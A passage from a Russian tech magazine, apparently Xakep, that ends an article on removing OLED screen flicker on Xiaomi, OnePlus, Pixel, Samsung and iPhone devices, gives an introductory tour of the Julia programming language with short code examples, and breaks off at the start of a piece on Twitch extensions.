му управления в своих телевизорах на фоне повального увлечения моделями
с ШИМ в 240 Гц. Одна ко такая схема управления уже не просто дороже,
а требует использования более качественных компонентов: светодиодов
подсветки в панелях LCD (это проще) или OLED‐панелей с более жесткими
стандартами контроля качества (именно на этом прогоре ла и продолжает
прогорать компания LG, которая никак не может наладить выпуск качес твен‐
ных OLED‐экранов для смартфонов).
  Пока же нам приходится иметь дело с мерцающими экранами — и пытать‐
ся что‐то с этим сделать самостоятельно.


DC DIMMING ОТ XIAOMI
Несмотря на то что Xiaomi не была первой компанией, отказавшейся
от модуляции ШИМ в OLED‐дисплеях смартфонов, именно Xiaomi первой
использовала немер цающий OLED в качестве маркетинговой фишки смар‐
тфона Black Shark 2 Pro.
  Сам термин DC Dimming также маркетин говое изобретение компании.
Аналогичную маркетин говую кампанию провел в свое время производитель
мониторов BenQ, выпустив в 2013 году линей ку мониторов Flicker Free. С тех
пор мерцание в компьютерных LCD‐мониторах пос тепенно стало дурным
тоном, от него отказались практичес ки все производители.





                  Источник: www.techradar.com

Изобретение Xiaomi неожиданно для самой компании отлично восприняли
пользователи и журналисты. «Мы тоже!» — поспешила компания OnePlus,
активировав подоб ный режим в OnePlus 7. «И мы!» — сказала материнская
компания OPPO, выпустив смартфон Reno с такой же возможностью. «И мы
тоже!» — присоединилась  к банкету  Huawei, выпустившая об новление
для смартфона P30 Pro.
   «Ах так?» — подумали в Xiaomi и анонсировали под держку DC Dimming
для ранее выпущен ных моделей, таких как Mi 9. «Мы не хуже!» — сказали One‐
Plus, но… оказалось, не все так прос то. Для моделей OnePlus 6 и 6T соответс‐
твующая опция доступна, но лишь в «лабора торных» настройках. Дело в том,
что прямое управление яркостью светодиодов на низкой яркости обнажает
недостатки OLED — здесь и «поехавшая» цветопередача, требующая прог‐
раммной компенсации, и структура «наждачной бумаги». В результате более
современные матрицы OnePlus 7 и 7 Pro выглядят в режиме «без мерцания»
заметно лучше более старых матриц из OP6 и 6T.





      Реклама режима DC Dimming для Xiaomi Mi 9 с китайского сайта

А что же Xiaomi? Если в смартфо не Black Shark 2 возможность прямого
управления яркостью заложена в настройки контроллера, то в предыдущих
моделях контроллер перепрограммировать не удалось. DC Dimming для этих
моделей доступен в виде своеоб разно го хака: для активации режима нужно
ввести в приложении «Телефон» код *#*#3225#*#*.


ОБРАТНАЯ СТОРОНА МЕДАЛИ
Итак, мы выяснили, что в Xiaomi Mi 9 мерцание отключается чисто програм‐
мным хаком. Более того, из некоторых особенностей становится понятно, что
режим DC Dimming, вероятно, реализован даже не на уровне ядра, а на уров‐
не framework‐прошив ки — где‐то недалеко от «ночного» режима (Reading
Mode в терминологии Xiaomi), который в ночное время уводит температуру
экрана в теплые оттенки.
   Что заставляет меня сделать такой вывод? Следующие наблюдения.
   Во‐первых, на экране блокировки (в момент, когда телефон заб локиро‐
ван) не работает ни «ночной» режим, ни DC Dimming. В темное ночное время
на заблокированном экране дисплей мерцает, а цветопередача — все в тех
же «холодных» оттенках без малейшего признака «ночного» режима. Но стоит
разблокировать аппарат, как мерцание тотчас же пропадает, а цвета при‐
обретают янтарный оттенок «ночного» режима.
   Во‐вторых, активация режима DC Dimming дурно влияет на функцию авто‐
матической яркости: телефон все время стремится сделать экран максималь‐
но темным. Постоянные нервные передвижения ползунка яркости помогают
в течение 10–15 секунд, пос ле чего яркость начина ет медленно пол зти вниз.
Очевидно, что датчик освещения и способ управления яркостью экрана никак
не  связаны  (это  легко  про верить,  установив  стороннее  приложение
для управления яркостью, например Lux Dash); такая ошибка воз можна толь‐
ко при безграмотной реализации автояркости.
  Наконец, никакого контроля цветопередачи на пониженной яркости тоже
не наблюдается: тестовые шаблоны при активированном режиме DC Dimming
выглядят точно так же, как при использовании наложения серого фильтра
(screen overlay) приложением Lux Dash, Darker или одним из множес тва
подобных.
  В то же время качество матрицы у Mi 9 на высоте: даже на минимальных
уровнях яркости заливка экра на серым цветом выглядит равномерно; нет
ни структуры «наждачной бумаги», ни гряз ных желтых пятен, как в LG G Flex 2.
Однако достигается это не совсем честным обра зом: на самых низких зна‐
чениях яркости (ниже 10%) экран Mi 9 все‐таки начинает мерцать, так что
о пол ном и безоговорочном отсутствии мерцания говорить не приходится.
Xiaomi корректно описыва ет «уменьшение» уровня мерцания, но не пол ное
избавление от него.
  В целом решение Xiaomi портировать DC Dimming на предыдущие модели
можно похвалить за намерение и популяриза цию проблемы — и серьезно
покритиковать за кривую реализацию.
  По имеющейся информации, в Xiaomi сей час работают над полностью
аппаратным решением проблемы мерцания OLED для новых моделей смар‐
тфонов.


ONEPLUS 7 И 7 PRO
Сразу после Xiaomi о поддержке DC Dimming заявила компания OnePlus —
в первую очередь для смартфонов OP7 и 7 Pro. Во вто рой вол не (в вышедших
буквально  на  днях  прошивках  OxygenOS  9.0.16  для  OnePlus  6T
и 9.0.8 для OnePlus 6) воз можность появилась и для прошлогодних флаг‐
манов компании. Новая возможность по умол чанию выключена; ее можно
активировать в настройках OnePlus Laboratory.





                  Источник: www.smartprix.com

Решение OnePlus также чисто софтовое. Судя по отзывам пользователей, DC
Dimming не распространяется на экран блокировки. Вероятно, это связано
с тем, что встроенный в экран оптический датчик отпечатков пальцев не
может работать при активном оверлее. Эту проб лему можно решить нас трой‐
ками на уровне контроллера дисплейного модуля; надеюсь, контроллеры
с соответствующими настройками появят ся в ближайшем будущем.


GOOGLE PIXEL 3 XL
Если для отключения мерцания на Xiaomi Mi 9 тебе достаточно ввести код
в номеронабирателе, то для Pixel 3 XL этот трюк не сработает. В этом смар‐
тфоне используется мат рица от LG довольно низ кого качества — заметный
разброс  параметров  и  ускоренное  выгора ние  пикселей  в  сравнении
с панелями от Samsung, которые Google устанавливает в младшую модель
Pixel 3. В то же время в отличие от младшей модели в Pixel 3 XL используется
гибридная схема управления яркостью: контрол лер довольно долго огра‐
ничивает ток перед тем, как все‐таки активировать ШИМ. Эта особенность
позволила разработчикам модифицировать ядро смартфона так, чтобы ШИМ
не включался вооб ще, а управление яркостью всегда происходило напрямую.
  Для отключения мерцания на Pixel 3 XL нужно проделать сле дующее.
 1. Разблокировать загрузчик. Это необ ходимо для установки кастомного
   ядра.
 2. Зайти на XDA и скачать ядро ImageBreaker.
 3. Прошить ядро через fastboot или уста новить через TWRP.

К сожалению, ядро уже уста рело, обновлений нет. Увы, но, если ты хочешь
Pixel 3 XL без мерцания, тебе придется действовать так же, как и пользовате‐
лям других смартфонов; об этом ниже.


SAMSUNG GALAXY S8+
Еще в 2017 году для это го смартфона энту зиасты собрали ядро, в котором
отключено мерцание. Ядро и инс трукции по его установке доступны на сайте
XDA.





                       Мерцание до





                     Мерцание после

Недостатки: неравномерность заливки на яркости ниже 40 кд/м2.





Проблема здесь та же, что и с ядром для Pixel 3 XL: собранное ядро было
заброшено и развития не получило.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
      БЕРЕГИ ГЛАЗА!
              АКТИВИРУЕМ DC DIMMING В IPHONE XS,
            PIXEL 3 XL, XIAOMI MI 9 И ДРУГИХ СМАРТФОНАХ





ДРУГИЕ СМАРТФОНЫ: РЕШЕНИЕ БЕЗ ROOT
До восьмой версии Android для понижения яркости можно было использовать
обычные экранные фильтры. С одной стороны, вклю чать‐выключать фильтр
вручную довольно неудоб но; с дру гой — приложения вроде Darker могут
как активироваться самостоятельно в заданное время суток, так и вре менно
отключать фильтр, если датчик освещения показы вает, что снаружи достаточ‐
но светло. Наконец, приложение Lux Auto Brightness пол ностью автомати‐
зирует процесс, позволяя задать минимальный уровень яркости (в процен‐
тах), ниже которого программа будет использовать серый фильтр overlay
переменной прозрачнос ти (чем ниже яркость, тем менее прозрачен фильтр).
  В Android 8 Oreo раз работчики Google ограничили возможности экранных
фильтров. В Android 8 и 9 приложения, использующие фильтры, больше
не могут распространить их действие на верхнюю область с часами и уведом‐
лениями, что сводит их практическую полезность на нет.
   Спустя некоторое время нашелся обходной путь: оказалось, что исполь‐
зование сервиса Accessibility поз воляет это ограничение обойти. На сегод ня
мне известны всего три приложения, которые умеют использовать для затем‐
нения экрана сервис Accessibility.
  Первое доступно в Google Play, но платное: Lower Brightness Pro.





В отличие от Darker, Lux Auto Brightness и мас сы подобных им приложе ний,
в этом действительно затемняется и строка уведомлений. К сожалению,
управление яркостью реализова но не слишком удоб но (кнопками + и ‐). Авто‐
матическое управле ние яркостью сохраня ется. Это неплохо для Android 8/8.1,
где можно зафиксировать положение ползунка яркости, но сводит с ума авто‐
матическую регулировку яркости в Android 9 и прошивках, имитиру ющих iOS
(то есть таких, в которых авто матическое изменение уровня яркости экрана
сдвигает положение движка управления яркостью).
   Есть и бесплатная альтернатива с XDA — ути лита PWMfree. К сожалению,
в Google Play приложения нет. Скачать приложение можно непосредственно
из ветки разработчика на XDA. Несмотря на бес платность, утилита пон‐
равилась мне заметно больше конкурента из Play Store: в ней удобное
управление яркостью движком из панели уведомлений, включение‐вык‐
лючение одной кнопкой. Датчик освещения отключается при акти вации
серого оверлея и включается обратно при деактивации.
  Однако оптимальным решением будет, пожалуй, бесплатное приложение
OLED Saver, обладающее рядом достоинств по сравнению с конкурентами:
 1. Работает в том числе и в зоне уведомлений.
 2. Есть настройка порогового зна чения аппа ратной регулировки уровня
   яркости (как в Lux).
 3. Есть быстрый переключатель для временного отклю чения сервиса.
 4. Регулировка яркости как ползунком, так и кнопками (удобно).
 5. Собственная реализация автояркости (она работа ет, хоть и неидеально).
 6. Несмотря на то что приложение использует службу Accessibility, оно дос‐
   тупно в Google Play.


ЕСЛИ ЕСТЬ ROOT
Если на твоем смартфоне есть root‐дос туп, можно использовать несколько
способов отключения ШИМ. Первым делом установи приложе ние Lux Auto
Brightness. Далее настрой значение, ниже которо го Lux будет использовать
серый фильтр вместо сис темного управления яркостью.





Без root‐доступа все будет работать уже на этом эта пе, но строка состояния
и область уведомлений в Android Oreo и Pie не будут покрыты оверлеем. Нас‐
троить альтернативный механизм управления яркостью можно в следующем
окне.





Если ты установил кастомное ядро и оно поддерживает KCAL — выбери соот‐
ветствующую опцию. Если же ядро не поддерживает KCAL,  установи
еще одно приложение из Play Store — CF.Lumen. Это при ложе ние использует
свой собственный драйвер для управления настройками экрана. Запусти его
и предоставь  root‐доступ, после чего в настройках  Lux выбери  пункт
«Интеграция с CF.Lumen Pro».
  Далее тебе придется натрениро вать приложение таким образом, чтобы
при заданных показаниях датчика освещенности экран горел с удобной тебе
яркостью. Задача решена, автояркость работа ет.


IPHONE X, XS И XS MAX
Традиционно Apple использовали в iPhone мат рицы, выполненные по тех‐
нологии IPS. OLED‐экран впервые появился в iPhone X, и в нем же поль‐
зователи смартфонов компании впервые столкну лись с мерцанием. В то же
время в iOS есть встро енный механизм, позволя ющий по желанию поль‐
зователя включать и отключать экранный филь тр заданной плотности, что
позволяет полностью изба виться от мерцания дис плея на низкой яркости.


Как про верить экран на мерцание
Наличие или отсутствие мерцания мож но проверить без специального обо‐
рудования, исполь зуя камеру другого смартфона. Открой на смартфоне
страницу  с  белым фоном  (например,  about:blank  в  браузере  Safari
или Chrome), вык лючи свет и понизь яркость до минимума. Если теперь
навести на экран камеру другого смартфона, то мерцание экрана будет выг‐
лядеть примерно так:





Чтобы определить, на каком уровне яркости прекращается мерцание экрана,
открой «Центр управле ния» и плавно двигай ползунок яркости. Исчезновение
диагональных полос означает отсутс твие ШИМ на данном уровне яркости.





Экспериментально уста новлено, что у iPhone X минимальный уровень яркости
без мерцания — 50%. Но если держать яркость на этом уровне, то в темноте
устройством  будет  пользовать ся  некомфортно.  Задача —  понизить
эффективный уровень яркости экра на, но не допустить мерцания.


Включаем серый фильтр
В настройках iOS есть специальный режим, который можно найти в нас трой‐
ках Accessibility → Display Accommodations.





В этом режиме экран искусственно затемняется программным фильтром. Я
не совсем понимаю, для чего нужен этот режим в устройствах с матрицей IPS
(он заметно снижает яркость белого цвета и уменьшает контрастность экрана
на том же уровне яркости подсветки, что приводит к ускоренному разряду
аккумулятора), однако для дисплеев OLED он более чем полезен.
   Чтобы вклю чить фильтр, зайди в Display Accommodations. Теперь нужно
нажать на надпись Display Accommodations и активировать ползунок Reduce
White Point (см. скрин шот). Значение плотности фильтра подбери экспе‐
риментально; попробуй начать со зна чения в промежутке от 85 до 100%
и настрой до комфор тного для собственных глаз уровня (яркость экрана
в центре управле ния должна быть на уровне 50%).





Отключение ШИМ тре мя кликами
На этом настройка не закончена; включать и выключать фильтр из нас троек —
долго и неудобно. Рекомендую повесить соответству ющую команду на трой‐
ной клик кнопкой включения экрана.
  Для этого найди в настройках опцию Accessibility Shortcut (никогда не могу
запомнить, в каком именно пункте меню она находится; проще всего исполь‐
зовать поиск по настройкам) и назначь на нее вклю чение и отключение фун‐
кции Reduce White Point (см. скриншоты).





На этом все. После активации этой функции мы получили iPhone, мерцание
экрана которого можно быс тро включать и отклю чать трехкратным нажатием
на боковую кнопку. Теперь мож но спокойно пользоваться устройством в тем‐
ноте.


Вы водим включение фильтра в «Центр управле ния»
Если ты предпочитаешь вклю чать/выключать экранный фильтр не кликом
на кнопку включения экрана, а командой в «Центре управления» — ты можешь
это сделать при помощи Accessibility Shortcuts (требуется iOS 12 или 13).
  Открой настройки и найди Control Center (в меню General), далее Cus‐
tomize Controls.





Иконка Accessibility Shortcuts находится под пунктом More Controls. Нажми
на Accessibility Shortcuts.





Иконка Accessibility Shortcuts будет добавлена в список доступных элементов
управления.





Проверь, что иконка добавилась в «Центр управления». Расположение иконки
можно изменить, перетащив ее в нужное мес то.





Для включения или выключения экранного филь тра теперь дос таточно зайти
в «Центр управления» и нажать на иконку Accessibility Shortcuts.





ЗАКЛЮЧЕНИЕ
Широтно‐импульсная модуляция — вещь противоречивая. С одной стороны,
ШИМ приводит к повышенной утомляемости и усталости глаз приб лизитель‐
но 30% пользователей (остальные 70% его не замечают, но при длительном
использовании мерцающих устройств со временем устает и их мозг). С дру‐
гой — использование ШИМ не только позволяет производите лям сэкономить
несколько десят ков центов на каждом устрой стве, но и дает им возможность
эффективно маскировать недостатки OLED‐панелей. Впервые OLED‐экран
без мерцания появился еще в 2015 году, но эксперимент оказал ся неудач‐
ным: на тот момент технология производства дис плеев не позволяла создать
панель, обладающую удовлетворительными характеристиками на низких
уровнях яркости.
  Начиная примерно с 2017 года качес тво панелей достигло такого уровня,
что производители стали массово использовать гиб ридную схему управления
яркостью; в относительно свежих устройствах ШИМ часто появляется лишь
на самых низких (25% и ниже) уровнях яркости.
  На сегодняшний день Samsung (LG предлагаю оставить в покое) выпус‐
кает достаточно качественные панели OLED, на которых пол ное отключение
ШИМ уже не приводит к заметной на глаз дег радации картинки. Сейчас
самое время отказаться от ШИМ в OLED‐экра нах. Китай ские производите ли
(Xiaomi, OnePlus, Oppo, Huawei) уже начали это делать; для крупных же про‐
изводителей процесс наверняка рас тянется на несколько лет. Пред лагаю
взять заботу о своих глазах в собственные руки, используя описанные
в статье методы избавления от мерцания.


        WWW

                  •DC Dimming против ШИМ, или как регулировать
                          яркость AMOLED без мерцания
                     •What  is DC Dimming & Why  it’s Important for
                    AMOLED Smartphones?
                        •Xiaomi and OnePlus add DC‐dimming as an alter‐
                              native to OLED PWM in their smartphone OS
                        •Xiaomi Mi 9 получил функцию DC dimming,
                         берегущую глаза
                      •OLED’s Cause a Shift in Display Driving to DC
                        Dimming to Improve Low Luminance Images
КОДИНГ





       НОВЫЙ ЯЗЫК, КОТОРЫЙ
        ВЫГЛЯДИТ, КАК PYTHON,
            А ЛЕТАЕТ, КАК C





                                            Yermack
                                              heavymetallwarrior@yandex.ru





Julia — молодой язык программирования, предназначенный
преимущес твенно для научных вычислений. Его создатели
хотели, чтобы он занял нишу, которую прежде занимали Mat‐
lab, его клоны и R. Создатели пытались решить так называ‐
емую проблему двух языков: совместить удобство R и Python
и производительность C. Посмотрим, что у них получилось.


ИСТОРИЯ
Разрабатывают  язык  в  Мас сачусетском   технологическом  институте
с 2009 года, а в начале 2012 года была выпущена публичная версия. Бета
имела много проблем и интересо вала только любопытных энтузиастов и раз‐
работчиков‐альтруистов,  которые  старались  прис пособить  окру жения
под постоянно меняющиеся стандарты.
   Вот что пишут создатели Julia.



    Мы хотим язык с откры тым исходным кодом, с либеральной лицен-
      зией. Мы хотим скорость C с динамиз мом Ruby. Нам нужен гомоико-
      нич ный язык с нас тоящими мак росами, как Lisp, но с оче вид ными,
      зна комы ми матема тичес кими обоз начениями, такими как в Matlab. Мы
      хотим  что‑то  такое же  удобное  для обще го  программирова ния,
       как Python, такое же прос тое для ста тис тики, как R, такое же естес-
      твенное для обра ботки строк, как Perl, такое же мощ ное для линейной
      алгебры,  как  Matlab, и  способное  скле ивать  программы вмес те
       как оболоч ку. Неч то прос тое в освоении, но при этом раду ющее
      самых  серьезных  хакеров. Мы  хотим  высокой  инте рак тивнос ти
      и эффектив ной ком пиляции. Мы ведь не слиш ком многого просим,
      вер но?

В августе 2018 года вышла версия 1.0.0, что породило бурный интерес к язы‐
ку. Джулию начали преподавать в университетах США, появились онлай новые
курсы (на Cursera и Julia Academy), стартовали коммерчес кие и исследова‐
тельские проекты, разработчики начали про являть инте рес, а владение этим
языком вошло в топ самых вос требованных про фессиональных навыков по
версии Upwork. Стабилизация синтаксиса, в свою очередь, вызвала взрывной
рост разработки вспомога тельных пакетов.


ХАРАКТЕРИСТИКИ
 • Ско рость: этот язык разрабатывался для высокой производительности.
   Программы, написанные на Julia, компилиру ются в эффективный нативный
   код для разных платформ через LLVM.
 • Об щность: используя парадигму мно жес твенной диспетче ризации, Julia
   облегчает выражение мно гих объектно ори енти рованных и функци ональ‐
   ных шаблонов программирования. Стандартная библиотека обеспечивает
   асинхронный ввод‐вывод, управление процес сами, ведение журнала, про‐
  филирование, менед жер пакетов и многое дру гое.
 • Динамич ность:  Julia поддерживает динами чес кую типизацию, ведет
   себя как язык сценариев и имеет хорошую поддержку для интерактивного
   использования.
 • Технологич ность:  Julia превосходна в высокотребовательных вычис‐
   лениях, име ет син таксис, который отлично подходит для математики, под‐
  держивает множество числовых типов данных и парал лелизм «из короб‐
   ки». Мультиметод этого языка идеально подходит для определе ния чис‐
   ловых и массивоподоб ных типов данных.
 • Опциональность: она имеет богатый язык описательных типов данных,
   и объявления типов могут использовать ся для уточнения и укрепления
   программ.
 • Адаптивность:  встроенная  система  управления  пакетами,  которые
  хорошо работают вместе. Матрицы еди ничных величин или таблицы дан‐
   ных, названий, чисел и изоб ражений — все можно обработать с одинако‐
   во хорошей производитель ностью.


Син таксис
Julia выглядит лучше, чем Matlab, но на достижение это не тянет. Сре ди
основных языков программирова ния закос тенелость и плохой дизайн Matlab
уступают только PHP. В Octave и Scilab некото рые из этих проб лем исправили,
но там есть и свои. Matlab и R берут тем, что у них огромные, собранные
за годы библиотеки наборов инс трументов и функций, с которыми легко
решать научные и вычис лительные задачи.
  В арсенале Julia этого пока нет: потребуются годы, чтобы создать собс‐
твенную настолько же полную библиотеку пакетов.
   Как и в перечисленных языках (Python, Matlab и прочие во главе с леген‐
дарным Fortran), в Julia есть срезы (Arr[:,1]), арифметические операторы
распространяются на массивы, а ин дексация начинается с единицы.
  Но вернемся к син такси су. Для начала создадим пару массивов‐векторов:


julia> A = [2, 3, 4]
3‐element Array{Int64,1}:
 2
 3
 4
julia> B = [6+2im, 0.8, ‐1]
3‐element Array{Complex{Float64},1}:
  6.0 + 2.0im
  0.8 + 0.0im
 ‐1.0 + 0.0im

Обрати внимание, что можно использовать разные числовые типы: тип под‐
гоняется под высший в иерархии. Теперь соз дадим массив‐строку и выпол‐
ним элементарные операции:


julia> C = [1 0 1]
1?3 Array{Int64,2}:
 1  0  1


julia> A+B
3‐element Array{Complex{Float64},1}:
 8.0 + 2.0im
 3.8 + 0.0im
 3.0 + 0.0im


julia> C * ans.^2
1‐element Array{Complex{Float64},1}:
 69.0 + 32.0im

Результат последних вычислений хра нится в переменной ans, в нашем слу‐
чае — массив, который получился при сложении А и В. Мы его поэлементно
возвели в квадрат и скалярно умножили на С.
  Давай посмотрим, как можно задавать функции.


function cube(x)
    x^3
end


cube(x) = x^3

Функции возвращают результат пос ледних вычислений, то есть return про‐
писывать не обязательно. Есть возможность использовать анонимные фун‐
кции (похоже на лямбды из Python). Нап ример, посчитаем евклидову норму
вектора:


sqrt( sum(x‐> x^2, Arr) )

Можно записать то же самое цепочкой функций (ведь это унарные операто‐
ры):


Arr.^2 |> sum |> sqrt

Нужные функции, как правило, уже есть в стандартной библиотеке. Для сле‐
дующих двух примеров есть аналог — hypot(Arr). Со строками работать так
же просто, как с массивами. Выполним конкатенацию и запросто реализуем
шифр Цезаря:


julia> "russian" * ' ' * "hacker"
"russian hacker"


julia> caesar(X, n) = prod( [x+n for x in X] )
caesar (generic function with 1 method)


julia> caesar("hakep.ru", 5)
"mfpju3wz"

Поскольку задать функцию и мно жес тво для соз дания массива можно нес‐
колькими способами, есть и разные стили написания. Тру стори: думаешь,
что за год хорошо разоб рался в языке, раз зада ешь массивы с помощью
вклю чений ([2*i for i = 1:10]), а потом однажды в чужом коде видишь 2*
[1:10;] и ничего не понима ешь. Так что неплохо поинтересоваться и ите‐
раторами тоже.


Ско рость
Скорость подкупает. Но если ты возь мешь и напишешь скрипт, выводящий
энный член множества Фибоначчи, окажется, что вычис ления идут медленно,
не быстрее, чем на Python. Скорость Julia дос тига ется за счет множественной
диспетчеризации с последу ющей JIT‐компиляцией.
  Преимущество модели метода Julia в том, что она хорошо сочетается
с диспетчеризацией по нескольким типам. При создании функции вида f(a,
b), в зависимости от операций, которые используются внутри, будут опре‐
делены методы для различных случаев. Ска жем, f(a::Int, b::Int), f(a::
Float, b::Int), f(a::String, b::Int) — для каждого будет скомпилиро‐
ван высокоэффективный код, во многом идентичный тому, что дает C или For‐
tran. И ты можешь посмотреть этот код с помощью прос тых команд:


function f(a,b)
    return 2a+b
end


@code_native f(2.0,3.0)


pushq   %rbp
movq    %rsp, %rbp
Source line: 2
vaddsd  %xmm0, %xmm0, %xmm0
vaddsd  %xmm1, %xmm0, %xmm0
popq    %rbp
retq
nop


@code_native f(2,3)


pushq   %rbp
movq    %rsp, %rbp
Source line: 2
leaq    (%rdx,%rcx,2), %rax
popq    %rbp
retq
nopw    (%rax,%rax)

Эта избыточность замедляет загрузку интерпретатора, пакетов и первый
запуск твоего скрипта. А так как интерпретатор имеет глобальную область
видимости и не допускает специфику типов, то будет генери роваться громоз‐
дкий низкоуровневый код, который старает ся предусмотреть любую нес‐
табильность типов.
   Это решается легко: обо рачивай свои операции в функции, избегай гло‐
бальных переменных и по возможности выстраивай логику программы, ори‐
ентируясь на конкретную задачу. Типы можно указывать и явно — как в ста‐
тически типизированных языках. Кстати, мой пример шифратора Цезаря
может принимать и строки, и мас сивы целых и комплексных чисел. Как дума‐
ешь, какой длины будет портянка LLVM, сгенерированная для этой функции?


Парал лельные вычисления
Как и остальные молодые языки вроде Go, Julia прос то обязана быть ори‐
ентированной на многопроцессорные операции «из коробки». В наше время
большие объемы вычислений выполняются в облачных сре дах, где по тре‐
бованию выделяются нуж ные ресурсы. Стандарт MPI, который используют
для организации работы  крупномас штаб ных параллельных приложе ний,
не отличается особой эластичностью. В ходе вычислений нельзя добавить
процессоры, и возможнос ти вос ста новления после сбоев весьма ограничен‐
ны.
  В Julia передача сооб щений отличается от MPI. Вмес то модели «запрос —
ответ» используется глобально рас пределен ное адресное пространство, что
позволяет легко оперировать ссылками на объекты на раз ных машинах и на
ходу добав лять допол нительные ресурсы.
  А еще это чертовски прос то реализовать! Вызыва ем пакеты, которые поз‐
волят осуществлять рас пределен ные вычисления и использовать общие
для всех процессов мас сивы. Ука зываем, что нужно посчитать парал лельно.


using Distributed, SharedArrays
addprocs(2)


a = SharedArray{Float64}(10)
@distributed for i = 1:10
    a[i] = i
end

Или вычислим число пи одним из самых непрактичных способов на двух
ядрах:


using Distributed, Statistics
addprocs(2)


@everywhere function PI(n)
    p = 0
    for i = 1:n
       x = rand(); y = rand()
       p += (x^2 + y^2) <= 1
    end
    4p/n
end
find_PI(N) = mean( pmap( PI, [N/nworkers() for i = 1:nworkers()] ) )


julia> @time fPI(1_000_000_000)
  2.674318 seconds (181 allocations: 7.453 KiB)
3.1416085999999996

В Julia используются такие техники, как Atomic Operations, Channels и Corou‐
tines, а также MPI и CUDA.
  Недавно была анонсирована новая способность Julia — Composable multi‐
threaded parallelism. Так что, если тебе нужно обработать 150 Тбайт астро‐
номических данных, повысить эффективность своей криптофермы, про‐
извести климатическое моделирование, ты зна ешь, какой инстру мент выб‐
рать.


До пол нительные пре иму щества
 • Документация одна из самых удоб ных и полных сре ди тех, что я встречал.
  К тому же ты всегда можешь вызвать справку по любой функции пря мо
   в консоли набора кода, нап ример: ?prod, ?sqrt, ?*, ??.
 • Набор и использование в коде символов Юникода. \lambda +  <Tab>
   превратится в λ — приятная мелочь, хоть и не все консоли и браузе ры ее
   отобразят.
 • Встроенный пакетный менеджер — парой команд можно скачать и нас тро‐
   ить пакет, если он сущес тву ет. Нес мотря на увеличение числа пакетов,
   часто узкоцелевые пакеты заброшены или забаго ваны. В крайнем случае
   ты всегда можешь написать свой.
 • Макросы и другие возможнос ти метапрограммирования. Это ускоряет
  оборачивание библиотек на других язы ках. Хороший при мер метап‐
   рограммирования — в пакете StructArrays.jl, где очень элегантно решена
   проблема SoA/AoS.
 • Функции  языка С мож но  вызывать  нап рямую,  функции  Python —
   при помощи PyCall. С другими популярными языками дружба тоже доволь‐
   но тесная.


ГДЕ ЗАПУСКАТЬ
 • REPL — консоль‐интерпретатор. Качаем с офи циального сайта и получа‐
  ем все возможности Julia из коробки.
 • Jupyter — удобный инстру мент, популярный у дата‐сайентистов.
 • Juno — IDE с обозревателем переменных и всеми недостатками Atom.
 • Дебагер — то, чего так дол го не хватало джу лиистам‐первопроходцам.
 • Cassette — возможность модифициро вать компилятор.

Плагины и редакторы:
 • Visual Studio Code;
 • JetBrains;
 • Vim;
 • Sublime Text;
 • Revise.


НАСУЩНЫЙ ВОПРОС
Может быть, ты уже задался воп росом, почему Julia не поддерживает объ‐
ектно ориентированное прог раммирование. Но это не так. Julia — муль‐
типарадигмальный язык, который под держивает методы из процедурного,
декларативного, функционального, мета и — внимание! — объ ектно ори енти‐
рованного программирова ния.
   Здесь все является объектом, есть нас ледование, абс трактные классы,
полиморфизм, инкапсуляция. Точнее, в Julia все есть множественная дис‐
петчеризация (multiple dispatch). Вместо завяз ки на экземпляре объ екта in‐
stance.method(…) будет метод, заточенный под объекты: method(instance,
…).
  Недостаток в том, что типы и методы по умолчанию не связаны между
собой: можно получить код, где для какого‐то типа нет методов либо они
есть, но конфликтуют. Практичес ки, идиоматичная Julia просто объединяет
все методы с одним и тем же именем.


julia> size
size (generic function with 89 methods)

В результате у Julia по дизайну все полиморфно. Так что Julia объ ектно ори‐
ентирована до глубины души. Но это неочевидно из‐за размытия границы
между функциональным программированием и объектно ориентированным.
  Создатели Julia были сосредоточены на раз работке язы ка для поддержки
математического прог раммирова ния. Исполь зование ООП в стиле С++
и Java, когда первый оператор владеет функци ей, было неудобно в плане
реализации и организации  кода. Методы класса не очень‐то полезны
при работе с векторами, мат рицами и тензорами, и наличие первого аргу‐
мента в выражении может привести к путанице.
  Еще одна вещь, которую люди часто замечают, — поля данных не могут
быть унаследованы, хотя не обязательно считать это неотъемлемой частью
ООП, это просто свой ство объектно ориентированных языков.
  Множественная диспетчериза ция — элегантное решение, которое дает
программисту большую часть преимуществ ООП и в то же время не конфлик‐
тует с тем, как в нем работает математика.


PYTHON ИЛИ JULIA
Из‐за пологой кривой обучения Julia почти идеаль на в качестве первого язы‐
ка программирования, с которого можно переучить ся на Python или углубить‐
ся в C. Я слышал, как преподаватели сету ют на то, что Python калечит в сту‐
дентах программистов и их потом трудно переучивать на что‐то более близ‐
кое к железу.
  Однако Julia не может делать все, что делает Python, хотя она применима
для большинства практичес ких целей. И, как любой язык программирования,
она имеет свои подводные камни. Ты можешь использовать метапрограм‐
мирование и макросы, переда вать их символьно в функции и из функций,
но действительно передавать сами макросы нель зя. Функция eval всегда
работает в области уровня модуля.
  В Python метаклассы и проверки доступны вез де, поскольку eval работает
в локальной области.
   Типы в Julia являются объектами, и ты можешь передавать конструкторы
типов сколько угодно, но типы могут быть определены только на верхнем
уровне модуля, и их нель зя изменить пос ле объ явления. Это важное отличие
от динамических языков вро де Python, Ruby, JavaScript и Smalltalk. Хотя типы
в Julia могут быть сгенерирова ны с помощью eval.
  В Python новые классы разрешено соз давать внутри функций, которые
существуют только в этой локальной области, и атрибуты класса можно
динамически исправлять во время выполнения.
   Разработчики Julia добились впечат ляющих результатов, но у их языка
еще нет той опоры, которая обеспечива ет долгосрочный успех. Даже сочета‐
ние удобства и скорости Julia не зас тавит поклонников Python ему изменить
(но это не точно). Python уже имеет связь с относительно низкоуровневыми
операциями в виде Cython и даже упаковку для LLVM — Numba.
  Для  data  science, machine  learning, ана литики,  научных вычис лений
и исследований Julia чертовски хороша. На ней удобно делать серверный
бэкенд и прочие насущ ные сервисы, рас считанные на долгую работу. Игры
на ней писать можно, но с оглядкой на прожорливые вычисления и другие
нагрузки. А вот кросс‐платформенные приложения на Julia без пля сок с буб‐
ном не получатся.
  Я не знаю, выстрелит Julia или нет, но изучать и применять ее можно уже
прямо сейчас.


        WWW

                     Для обучения на английском есть много ресур‐
                       сов. На русском же из книг только устаревшая
                      «Осваиваем язык Julia» Малкольма Шеррингтона.
                   Еще  есть  статьи  на  Хаб ре  и  самоучитель
                       на GitHub.
КОДИНГ
 TWITCH
     EXTENSIONS





     ПИШЕМ СВОЕ РАСШИРЕНИЕ
       ДЛЯ ВЗАИМОДЕЙСТВИЯ
         СО ЗРИТЕЛЯМИ





Два года назад разработчики  стримин‐
